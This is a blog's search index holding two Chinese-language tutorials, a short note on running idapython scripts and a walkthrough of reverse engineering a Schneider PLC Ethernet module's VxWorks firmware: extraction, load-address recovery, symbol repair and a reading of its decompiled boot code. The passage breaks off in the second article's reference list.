<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【idapython】逆向分析脚本实践</title>
    <link href="/article/11099.html"/>
    <url>/article/11099.html</url>
    
    <content type="html"><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>这两天尝试复现一些二进制分析的论文工作，发现自己对<code>idapython</code>的使用知之甚少，在复现的过程中遇到了不少阻力，因此写一篇<code>idapython</code>使用的实践文章，也算一个小教程，记录一下学习的经历。</p><h2 id="Something-you-need-to-know"><a href="#Something-you-need-to-know" class="headerlink" title="Something you need to know"></a>Something you need to know</h2><p>这里需要重点说明几点：</p><ol><li><code>idapython</code>是<code>ida pro</code>的一个插件，必须要在<code>ida</code>中使用或者通过<code>ida</code>程序的命令行执行方式运行，并不像普通的<code>python</code>包那样，可以在自己的项目中独立使用，这也意味着它难以用一般的ide(如<code>pycharm</code>)进行代码调试</li><li>虽然在<code>ida7.4</code>之后支持了<code>python3</code>，但目前主流的项目和教程资料仍在使用<code>python2</code>，因此建议还是使用<code>python2</code>做<code>idapython</code>脚本的编写</li><li><code>idapython</code>三个主模块位于<code>ida pro</code>安装目录下的<code>python</code>目录，因此，若想要更好的调用提示（ide中），可选择将这个<code>python</code>目录中的模块拷贝到自己的项目中（但在执行脚本的时候依然得用<code>ida</code>执行），或者直接选择在该目录下编写代码。</li></ol><blockquote><p>之所以强调这几点，是因为看过很多现有的网上教程，大多没有对此说明，而是直接给出样例代码和接口，让人在直接复现的时候经常各种报错，异常。</p></blockquote><h2 id="Three-methods-to-run-IDAPython-scripts"><a href="#Three-methods-to-run-IDAPython-scripts" class="headerlink" title="Three methods to run IDAPython scripts"></a>Three methods to run IDAPython scripts</h2><p>运行<code>idapython</code>的脚本有三种方法：</p><ol><li><p>启动ida后，在最下方的命令行窗口直接输入<code>python</code>指令，有点类似<code>ipython</code>的交互模式，但没有提示，多行输入的时候需要手动敲空格，十分难用！！！</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210618203013.png" style="zoom: 80%;" /></p></li><li><p>以脚本文件的形式上传<code>python</code>脚本文件，相当于在<code>ida</code>中直接运行，该脚本文件仅针对<code>ida</code>打开的二进制文件，适合对单个二进制文件的分析</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210619092315.png" style="zoom:67%;" /></p><ol><li>在命令行中通过<code>ida</code>程序直接运行跟上<code>python</code>脚本，需要用到<code>-S</code>等相关参数，可以参考<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="IDAPyhon 脚本批量分析程序 | 0x4C43’s Blog">[1]</span></a></sup></li></ol><h2 id="IDAPython-Usage"><a href="#IDAPython-Usage" class="headerlink" title="IDAPython Usage"></a>IDAPython Usage</h2><p><code>idapython</code>提供了三个主要模块，分别是：</p><ul><li><code>idc</code>: 提供IDC中所有的函数功能（例如返回段名、起始地址）</li><li><code>idautils</code>: 提供大量实用函数，能够转换成python的相关对象，如列表</li><li><code>idaapi</code>: 通过类的方式，访问更多底层数据</li></ul><p>实操是理解的最好途径，关于这方面的使用，网上有许多现成的博客，这里就不重复叙述了，具体可以参考<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="idapython使用笔记 | wonderkun’s | blog">[2]</span></a></sup>，在遇到某个接口函数使用遗忘的时候也可以用于查询。</p><p>这里再提供一本<a href="/download/IDAPython-Book翻译byfoyjog.pdf">idapython book翻译本</a>，可以作为学习<code>idapython</code>的参考书。</p><hr><p>一个具体的使用场景的例子，待补充…</p><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="http://0x4c43.cn/2018/0803/idapyhon-script-batch-analysis-program/">IDAPyhon 脚本批量分析程序 | 0x4C43’s Blog</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://wonderkun.cc/2020/12/11/idapython使用笔记/">idapython使用笔记 | wonderkun’s | blog</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://y4ung.blog.csdn.net/article/details/89421793">IDApython插件编写及脚本批量分析教程_y4ung-CSDN博客</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ida</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VxWorks 固件分析初体验</title>
    <link href="/article/41651.html"/>
    <url>/article/41651.html</url>
    
    <content type="html"><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>最近在研究工控设备的固件，尝试对其进行一些基础的分析工作，手头大多数的固件采用的是<code>VxWorks</code>操作系统，而非一般嵌入式设备使用的<code>Linux</code>，很多东西属于刚入门一窍不通。另外，关于<code>VxWroks</code>的工作和学习资料非常杂乱且稀缺，即便找到的也对新手十分不友好，本人在摸爬滚打中也踩了不少坑，这里做一个总的整理，希望能对同样受此困扰的盆友提供一点启发。</p><div class="note note-warning">            <p>⚠️ 本博客随时根据笔者对<code>VxWorks</code>的认知理解进行更新调整</p>          </div><h2 id="From-the-beginning"><a href="#From-the-beginning" class="headerlink" title="From the beginning"></a>From the beginning</h2><p>一切的开始源于<code>seebug</code>上的一篇针对<code>VxWorks</code>固件分析的文章 <a href="https://paper.seebug.org/771/">基于 VxWorks 的嵌入式设备固件分析方法介绍</a>，作者写的时间比较久远，笔者照葫芦画瓢遇到了许多坑，没办法像原作者一样十分顺利地完成分析工作，不过核心的分析流程还是以该博客为主。</p><p>采用的是施耐德昆腾系列PLC的NOE-711以太网模块固件<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="测试附件下载地址 (schneider-electric.com)">[1]</span></a></sup></p><h2 id="Extract-firmware"><a href="#Extract-firmware" class="headerlink" title="Extract firmware"></a>Extract firmware</h2><p>要对固件进行分析，需要先提取固件映像中的内容，最常见的就是利用<code>binwalk</code>，首先对解压的固件映像文件分析，查看内容：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521172409.png" alt=""></p><p>发现是单个压缩文件，直接用<code>binwalk</code>解压发现得到一个<code>385</code>的文件，与压缩包的偏移对应，对<code>385</code>再次用<code>binwalk</code>查看基本信息：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521181747.png" alt=""></p><p>可以看到<code>VxWorks</code>的内核信息，这个就是具体被加载的映像了，后面就需要用到反编译的工具了，目前常用的有：</p><ul><li>IDA Pro</li><li>Ghidra</li></ul><h2 id="Analysis-firmware-loading-address"><a href="#Analysis-firmware-loading-address" class="headerlink" title="Analysis firmware loading address"></a>Analysis firmware loading address</h2><p>通过<code>binwalk -A 385</code>指令可以发现该固件采用的是<code>PowerPC big-endian</code>架构，将其拖到<code>IDA</code>中，更改相应架构：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521182515.png" alt=""></p><p>加载地址先选择默认：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521182555.png" alt=""></p><p>赶紧去的时候发现一个函数都没有，按<code>c</code>将光标所在地址处的内容解析成代码，可以参考这篇文章<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="IDA Pro扩展——脚本+插件 | Aye’s house">[2]</span></a></sup>包含对<code>IDA</code>常用快捷键的介绍。发现只有部分函数被解析了出来，这是因为初始内存地址没有选对：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521183020.png" alt=""></p><p>按照原博客提供的思路，寻找起始地址的方式有很多，有些过于麻烦，并非是分析的重点，这里先用最简便的方法。</p><h3 id="Analysis-firmware-header-code"><a href="#Analysis-firmware-header-code" class="headerlink" title="Analysis firmware header code"></a>Analysis firmware header code</h3><p>就像<code>linux</code>等常用操作系统需要<code>BIOS</code>将操作系统加载到指定的内存地址上一样，<code>VxWroks</code>在初始化的时候也需要将操作系统的代码加载到指定内存，因此我们可以通过分析初始代码的一些行为来确定初始化地址。在汇编代码的起始处，有一段针对<code>r1,r3</code>寄存器的操作，原博客对这段代码做了解释，这里同样粘一下：</p><p><img src="C:\Users\GentleCP\AppData\Roaming\Typora\typora-user-images\image-20210521190826938.png" alt="image-20210521190826938"></p><blockquote><p>原文中应该是笔误，跳转地址是<code>0x1CD94</code></p></blockquote><p>有一些基础知识需要说明一下：</p><ul><li><code>r1</code>：栈指针寄存器，相当于<code>esp</code></li><li><p><code>r3</code>：第一个参数，相当于<code>x64</code>里第一个存储参数的寄存器</p></li><li><p><code>lis</code><sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="PPC学习笔记">[3]</span></a></sup>：寄存器高位赋值，加载立即数并左移16位，通常接<code>addi</code>命令，实现对寄存器高低位的赋值</p></li><li><code>addi</code>: 立即数增加，与<code>add</code>相似</li><li><code>b</code>: 无条件跳转指令，同<code>j</code>，<code>ba</code>是相对地址无条件跳转，<code>bl</code>是跳转前将下一条指令的地址记录到<code>lr</code></li></ul><p>一开始开辟的栈地址被称作<strong>初始化栈</strong>，为<code>userInit</code>函数（<code>VxWorks</code>引导后运行的第一个函数）开的，这里可以猜想跳转的就是<code>userInit</code>，而初始化栈的高地址为<code>0x10</code>，这里直接用一下原博客的图：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521191510.png" alt=""></p><p>可以知道映像加载地址和初始栈的地址是一致的，为<code>0x10</code></p><hr><p>知道加载地址后，我们重新用<code>IDA</code>加载固件，并设置起始地址如下：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521192658.png" alt=""></p><h2 id="Repair-function-name"><a href="#Repair-function-name" class="headerlink" title="Repair function name"></a>Repair function name</h2><p>直接解析得到的函数名都是<code>Sub_xxx</code>偏移的形式，在一开始对<code>385</code>分析的时候可以发现固件中存在函数符号表，其地址为<code>0x301E74</code>，用<code>010 editor</code>编辑查看<code>385</code>文件，找到对应地址，得到数据如下：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521194722.png" alt=""></p><blockquote><p>此处有一点没弄明白，用binwalk查看得到的符号表地址是<code>0x301E74</code>，但原作者选择的却是<code>0x301E60</code>，这点没有理解</p></blockquote><div class="note note-info">            <p>关于<code>vxworks</code>的符号表，这里穿插一下，可以看看这篇文章<a href="https://jaubert.gitee.io/%E5%86%8D%E8%B0%88vxworks%E7%AC%A6%E5%8F%B7%E8%A1%A8%E4%BF%AE%E5%A4%8D/#%E7%AC%A6%E5%8F%B7%E8%A1%A8%E7%BB%93%E6%9E%84">再谈VxWorks符号表修复 - JaubertLong</a>，测试固件采用的是<code>VxWorks5.x</code>版本的(和<code>6.x</code>版本有较大不同)，符号表表项以16个字节一个单位，因此在图中可以分辨出一个表项的数据如下：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210522144245.png" alt=""></p>          </div><p>按照原作者给出的修复脚本，我尝试对原固件的函数名称进行符号修复，但发现会出现很多未知的警告和问题，最终修复效果很差，后来用了另一个博客<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="施耐德140NOE77101固件逆向分析 - B3ale (qianfei11.github.io)">[6]</span></a></sup>的修复脚本成功进行了修复，修复代码如下：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> idaapi <span class="token keyword">import</span> <span class="token operator">*</span>loadAddress <span class="token operator">=</span> <span class="token number">0x10000</span>eaStart <span class="token operator">=</span> <span class="token number">0x301E64</span> <span class="token operator">+</span> loadAddress  <span class="token comment"># 起始地址和结束地址的选取是根据最后4个字节类型是否为符号表类型来的</span>eaEnd <span class="token operator">=</span> <span class="token number">0x3293A4</span> <span class="token operator">+</span> loadAddressea <span class="token operator">=</span> eaStart<span class="token keyword">while</span> ea <span class="token operator">&lt;</span> eaEnd<span class="token punctuation">:</span>    offset <span class="token operator">=</span> <span class="token number">0</span>    MakeStr<span class="token punctuation">(</span>Dword<span class="token punctuation">(</span>ea <span class="token operator">-</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span> BADADDR<span class="token punctuation">)</span>    sName <span class="token operator">=</span> GetString<span class="token punctuation">(</span>Dword<span class="token punctuation">(</span>ea <span class="token operator">-</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> ASCSTR_C<span class="token punctuation">)</span>    <span class="token keyword">print</span> sName    <span class="token keyword">if</span> sName<span class="token punctuation">:</span>        eaFunc <span class="token operator">=</span> Dword<span class="token punctuation">(</span>ea <span class="token operator">-</span> offset <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>        MakeName<span class="token punctuation">(</span>eaFunc<span class="token punctuation">,</span> sName<span class="token punctuation">)</span>        MakeCode<span class="token punctuation">(</span>eaFunc<span class="token punctuation">)</span>        MakeFunction<span class="token punctuation">(</span>eaFunc<span class="token punctuation">,</span> BADADDR<span class="token punctuation">)</span>    ea <span class="token operator">+=</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p> 如果用<code>IDA Pro7.0+</code>的版本，还会遇到<code>MakeStr</code>函数报错的问题，解决方法<a href="https://bbs.pediy.com/thread-229574.htm">点这里</a></p></blockquote><p><code>IDA Pro</code>本身并不支持<code>PowerPC</code>指令架构的反编译，为了方便对源代码分析，后门采用另一款反编译软件<code>Ghidra</code>，有两种好处</p><ul><li>一是在<code>Ghidra</code>中使用<code>VxHunter</code>，作者给出了较为详细的教程，我们可以利用<code>vxhunter</code>实现自动化的函数名修复</li><li>二是<code>Ghidra</code>对于<code>VxWorks</code>（ppc架构）的反编译做的比<code>IDA</code>好，可以直接得到反编译的代码</li></ul><h3 id="Repair-symbol-with-Ghidra-and-vxhunter"><a href="#Repair-symbol-with-Ghidra-and-vxhunter" class="headerlink" title="Repair symbol with Ghidra and vxhunter"></a>Repair symbol with Ghidra and vxhunter</h3><p>关于<code>Ghidra</code>的使用，其官网<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="Ghidra (ghidra-sre.org)">[4]</span></a></sup>给出了非常详细的教程，这里不再赘述，主要说明一下如何在<code>Ghidra</code>中添加<code>vxhunter</code>，根据<code>Github</code>仓库中的描述：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521201739.png" alt=""></p><ol><li>在<code>Ghidra</code>主界面点击<code>window</code>，选择<code>Script Manager</code></li><li>单击右上角列表选项，选择➕，并在内容中选择<code>vxhunter</code>对应脚本所在的目录<code>vxhunter/firmware_tools/ghidra</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210523084904.png" alt=""></p><ol><li>点击<code>activating</code>（绿色的激活按钮），关闭后就能在<code>VxWorks</code>分类中看到新加的脚本了</li></ol><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521202244.png" alt=""></p><p>当脚本激活后，我们运行脚本<code>vxhunter_firmware_init.py</code>，它会自动找到符号表所在位置，并将对应的函数名称修复，下面是运行后的结果，右侧还有反编译的代码。</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521202503.png" alt=""></p><p>选择<code>userInit</code>函数，还能看到对应的汇编代码，发现和之前的猜想是一致的：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521202612.png" alt=""></p><h2 id="Firmware-analysis"><a href="#Firmware-analysis" class="headerlink" title="Firmware analysis"></a>Firmware analysis</h2><p>此时一切就绪，可以对固件的内容进行分析了，现阶段笔者对于<code>VxWorks</code>的理解较浅，这里只是做简单的分析，以<code>loginUserAdd</code>函数为例，查询官方文档<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="loginLib (ryerson.ca)">[5]</span></a></sup>，容易发现该函数用于添加一个登录用户，因此，可以猜测存在一些后门用户被默认添加进来。</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521204122.png" alt=""></p><p>在<code>Ghidra</code>中查询<code>LoginUserAdd</code>函数，可以发现它被另外几个函数调用：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521204157.png" alt=""></p><p>查看其中具体的添加用户过程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210521205128.png" alt=""></p><p>更详细的分析留待以后补充。</p><h2 id="The-mechanism-of-VxWroks"><a href="#The-mechanism-of-VxWroks" class="headerlink" title="The mechanism of VxWroks"></a>The mechanism of VxWroks</h2><p>本部分主要是借助测试固件的反编译代码来了解<code>VxWorks</code>的工作原理，直接顺着源码撸一遍，参考的资料主要是<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="施耐德140NOE77101固件逆向分析 - B3ale (qianfei11.github.io)">[6]</span></a></sup>和安全客大牛的<sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="工控安全入门（五）—— plc逆向初探 - 安全客，安全资讯平台">[7]</span></a></sup></p><h3 id="sysInit"><a href="#sysInit" class="headerlink" title="_sysInit"></a>_sysInit</h3><p>最开始是<code>_sysInit(void)</code>函数，用于系统初始化，反编译结果如下：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* WARNING: This function may have set the stack pointer */</span><span class="token keyword">void</span> <span class="token function">_sysInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">instructionSynchronize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 指令同步,对应isync指令</span>  <span class="token function">TLBInvalidateAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 快表操作，对应tlbia指令</span>  <span class="token function">usrInit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xc000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>前面两个函数可以暂时理解为一些基础的初始化操作，重点关注<code>userInit()</code>对用户初始化的部分。</p><blockquote><p>这里传入的参数<code>0xc00000</code>是<code>r4</code>寄存器，反编译的时候错误传入，是软件本身的锅</p></blockquote><h3 id="userInit"><a href="#userInit" class="headerlink" title="userInit"></a>userInit</h3><p>先看下汇编代码和反编译的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210522152311.png" alt=""></p><blockquote><p>这里需要说明一点，在powerpc中，寄存器<code>r0, r3-r12</code>和特殊寄存器<code>lr,ctr,xer,fpscr</code>是易失性的，即它们的值会在函数调用过程中发生变化，因此在函数调用过程中不能采用它们的值，这也解释了经常性会看到一些指令将数据从某些易失的寄存器保存到非易失的寄存器中。</p></blockquote><ul><li><code>stwu r1, local_18(r1)</code>：<code>stwu</code>保存<code>rs</code>寄存器内容到内存，上面红框中对应的是将<code>r1</code>的内容送到<code>r1+local_18</code>的地址（<code>r1</code>是栈顶指针）。 相当于开辟了栈空间，此时栈大小为<code>0x18</code></li><li><code>mfspr r0, lr</code>: 将<code>lr</code>（函数返回地址寄存器）的值给<code>r0</code>，相当于保存一遍函数返回地址，在查询指令的时候也可以查<code>mflr</code></li><li><code>stw r31, local_4(r1)</code>: 将<code>r31</code>的内容送到<code>r1+local4</code>地址中</li><li><code>stw r0, local_res4(r1)</code>: 将<code>r0</code>的内容送到<code>r1+local_res4</code>中</li><li><code>or r31 r1,r1</code>: 将<code>r1</code>与<code>r1</code>或运算保存到<code>r31</code>中，或本身不影响<code>r1</code>的值，这里相当于是做一个<code>mov r31 r1</code>，用或运算可能效率更高</li><li><code>stw r3, local_10(r31)</code>： 将<code>r3</code>的内容送到<code>r31+local_10</code>的地址中</li><li><code>lwz r3, local_10(r31)</code>: <code>lwz</code>按字取值，相当于<code>r3=mem(r31+local_10)</code></li></ul><p>上面一堆数据移来移去，可能容易绕晕，但是看下面是进入正式的函数调用，可以猜想这些操作对应<code>x86</code>中函数调用后对栈的布局操作，将参数放到栈基址特定偏移的位置。注意之前说过<code>r3</code>是第一个参数寄存器，相当于其保存了传入的参数0，我们看一下这几个<code>local</code>变量：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210522154516.png" alt=""></p><p>现在我们可以绘制一下此时的栈中布局：</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">|            |  --------------|    r0      |0x4, r0此时保存了函数返回地址lr--------------|            |  初始r1，栈顶，记作0x0，当开辟栈空间之后此处就是栈基址--------------|    r31的值  |  -0x4--------------|            |  -0x8--------------|            |  -0xC--------------|    r3的值   |  -0x10，传入的函数参数--------------|     r31    |  -0x14 ，在or r31 r1,r1指令后，r31保存的是r1的值--------------|     r1的值  |-0x18 ，此时保存的是栈基址地址--------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>下面依次看每个函数的工作：</p><ul><li><code>sysStart(0)</code></li></ul><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sysStart</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>_func_smObjObjShow<span class="token punctuation">,</span><span class="token number">0x157914</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将起始地址到结束地址部分的内容初始化为0</span>  sysStartType <span class="token operator">=</span> param_1<span class="token punctuation">;</span>   <span class="token comment">// 选择系统的启动方式，有bootram（压缩式）和rom（非压缩式）两种</span>  <span class="token function">intVecBaseSet</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 设置中断向量表起始地址为0</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li><code>cacheLibInit(1,1)</code>: 对函数库的初始化，具体的暂时不关心</li><li><code>excVecInit()</code>： 初始化中断向量表，在前面<code>intVecBaseSet</code>设置中断向量表起始地址为0之后</li></ul><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined8 <span class="token function">excVecInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token operator">*</span>piVar1<span class="token punctuation">;</span>  undefined4 <span class="token operator">*</span>puVar2<span class="token punctuation">;</span>    puVar2 <span class="token operator">=</span> <span class="token operator">&amp;</span>DAT_0030a488<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>PTR_excExcHandle_0030a490 <span class="token operator">!=</span> <span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span>puVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>puVar2<span class="token punctuation">,</span>puVar2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Var2[1]指向的是函数excConnect，这里相当于执行函数excConnect(常数, excExcHandle)，是对中断表做初始化的过程</span>      piVar1 <span class="token operator">=</span> puVar2 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment">// 注意Var2的位置，这里的+5是地址+5（理解为数组下标偏移），从0030a488的位置向下偏移5个位置，对应的是`excExcHandle`</span>      puVar2 <span class="token operator">=</span> puVar2 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token comment">// 同上，此时更新Var2的位置，到了一个新的常数位置，对应地址是0030a494，</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>piVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 验证handle是否为空</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>里面比较关键的是变量<code>puVar2</code>，它被赋予了一个地址<code>0030a488</code>，直接跳转到对应位置查看：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210522163102.png" alt=""></p><p>该过程应该明了了，通过两个指针不断地迭代，调用函数<code>excConnect(data, excExcHandle)</code>来完成中断的初始化，直到<code>excExcHandle</code>为0结束，这时候终端表初始化完毕。</p><ul><li><code>sysHwInit()</code>：初始化外设为<code>disable</code>的状态</li><li><code>usrCacheEnable()</code>:  使能状态，让固件可以使用</li><li><code>wvLibInit()</code>: 在这个里面只有一个<code>evtObjLogFuncBind();</code>函数，应该时做了一个事件日志函数的绑定操作，可能是用于对发生事件进行日志输出的</li><li><code>usrKernelInit()</code>: 到了最重要的内核初始化了</li></ul><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">usrKernelInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  undefined8 uVar1<span class="token punctuation">;</span>    <span class="token function">classLibInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 类函数库初始化</span>  <span class="token function">taskLibInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 任务函数库初始化</span>  <span class="token comment">// 下面的qInit和workQInit()都是对队列的初始化，因为VxWorks的工作方式是任务型的，创建任务添加到队列中执行</span>  <span class="token function">qInit</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>readyQHead<span class="token punctuation">,</span>qPriBMapClassId<span class="token punctuation">,</span><span class="token operator">&amp;</span>readyQBMap<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qInit</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>activeQHead<span class="token punctuation">,</span>qFifoClassId<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qInit</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tickQHead<span class="token punctuation">,</span>qPriListClassId<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">workQInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  uVar1 <span class="token operator">=</span> <span class="token function">sysMemTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// kernelInit最重要的功能就是创建了一个usrRoot任务，配置一大堆任务必要信息</span>  <span class="token function">kernelInit</span><span class="token punctuation">(</span>usrRoot<span class="token punctuation">,</span><span class="token number">20000</span><span class="token punctuation">,</span><span class="token number">0x490d2c</span><span class="token punctuation">,</span>uVar1<span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>在<code>kernelInit</code>中将<code>usrRoot</code>作为参数传入，并在调用<code>taskInit</code>的时候用作参数，实现对<code>usrRoot</code>任务的初始化，具体的初始化过程可以参考<a href="https://qianfei11.github.io/2020/07/05/施耐德140NOE77101固件逆向分析/#Create-a-new-task-——-usrRoot">施耐德140NOE77101固件逆向分析 - B3ale (qianfei11.github.io)</a></p><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a 